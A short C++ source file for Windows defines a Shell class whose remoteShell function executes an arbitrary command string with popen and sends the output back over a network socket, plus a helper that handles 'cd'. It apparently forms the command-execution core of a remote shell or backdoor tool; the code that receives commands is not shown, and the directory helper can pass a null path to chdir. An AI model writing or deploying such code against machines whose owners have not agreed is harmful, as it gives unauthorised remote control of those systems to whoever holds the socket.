#include <windows.h>
#include <string.h>
#include <dir.h>

#include"shell.h"


void Shell::remoteShell(char *cmd, SOCKET s){
    char buf[LEN_DATA] = {'\0'};
    FILE *f = nullptr;
    if(strncmp(cmd, "cd ", 3) == 0)
        changeDir(cmd);
    else if((f = popen(cmd, "r")) != nullptr){
        while(fgets(buf, sizeof(buf), f) != nullptr){
            send(s, buf, strlen(buf), 0);
        }
        pclose(f);
    }
}


int Shell::changeDir(char *path){
    char *tmp = nullptr;
    strtok(path, " ");
    tmp = strtok(nullptr, " ");
    return chdir(tmp);
}
